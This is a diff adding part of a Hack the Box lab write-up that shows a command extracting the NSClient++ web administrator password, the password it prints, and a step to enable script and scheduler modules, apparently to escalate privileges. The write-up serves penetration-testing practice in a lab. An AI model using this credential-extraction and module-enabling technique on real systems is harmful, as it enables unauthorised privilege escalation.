@@ -289,4 +289,13 @@ searchsploit -x windows/local/46802.txt
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b8615c7c-382c-42e8-a1c6-afcbbd8b7a7e)
 
-
+Exploit
+- Grab web administrator password
+```CSS
+nscp.exe web -- password --display
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d239dd4c-f31a-43dc-b32d-6128c6c5e32d)
+```CSS
+Current password: ew2x6SsGTxjRwXOT
+```
+- Login and enable the `CheckExternalScripts` and `Scheduler` modules including enable at startup and save configuration
